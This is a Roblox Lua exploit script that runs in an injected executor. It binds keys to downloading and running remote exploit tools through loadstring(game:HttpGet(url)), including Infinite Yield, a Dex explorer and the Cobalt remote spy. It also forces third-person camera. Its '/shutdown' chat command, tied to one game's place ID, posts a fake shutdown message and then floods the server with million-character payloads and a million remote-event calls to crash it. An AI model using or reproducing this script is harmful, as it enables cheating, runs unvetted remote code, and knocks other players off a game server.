if not game:IsLoaded() then
	game.Loaded:Wait()
end

local pls = game:GetService("Players")
local uis = game:GetService("UserInputService")
local tp = game:GetService("TeleportService")
local rs = game:GetService("ReplicatedStorage")
local tcs = game:GetService("TextChatService")

local lp = pls.LocalPlayer
local env = getgenv()

if env.helper then
	for _, con in env.helper do
		con:Disconnect()
	end
end

env.helper = {}

local scripts = {
	[Enum.KeyCode.Insert] = "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source",
	[Enum.KeyCode.Delete] = "https://github.com/AZYsGithub/DexPlusPlus/releases/latest/download/out.lua",
	[Enum.KeyCode.Home] = "https://gitlab.com/upio/cobalt/-/releases/permalink/latest/downloads/Cobalt.luau",
}

function rejoin()
	warn("[h] rejoin")

	tp:TeleportToPlaceInstance(game.PlaceId, game.JobId, lp)

	while task.wait(0.1) do
		tp:Teleport(game.PlaceId, lp)
	end
end

function thirdperson()
	warn("[h] thirdperson")

	lp.CameraMode = Enum.CameraMode.Classic
	lp.CameraMinZoomDistance = 10
	lp.CameraMaxZoomDistance = 1000

	task.wait(0.03)

	lp.CameraMinZoomDistance = 0
end

function shutdown()
	warn("[h] shutdown")

	tcs.TextChannels.RBXGeneral:SendAsync("Shutting down server...")

	lp.PlayerGui:Destroy()
	lp.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)

	task.wait(0.1)

	local events = rs.DataEvents

	events.UpdateTexturesChoice:FireServer(("a"):rep(1e6))
	events.UpdateLineColorsEvent:FireServer(("a"):rep(1e6))

	task.wait(0.1)
	for i = 1, 1e6 do 
		events.DataRemoteEvent:FireServer()
	end
end

env.helper.input = uis.InputBegan:Connect(function(input)
	local url = scripts[input.KeyCode]

	if url then
		warn("[h]", input.KeyCode.Name)
		loadstring(game:HttpGet(url))()
	elseif input.KeyCode == Enum.KeyCode.End then
		thirdperson()
	end
end)

env.helper.chat = lp.Chatted:Connect(function(message)
	if message == "rj" then
		rejoin()
	elseif message == "/shutdown" and game.PlaceId == 6961824067 then
		shutdown()
	end
end)

env.helper.tp = tp.TeleportInitFailed:Connect(function(player, result, message)
	if player == lp then
		warn("[h] teleport failed:", result.Name, message)
	end
end)

warn("[h] ready")
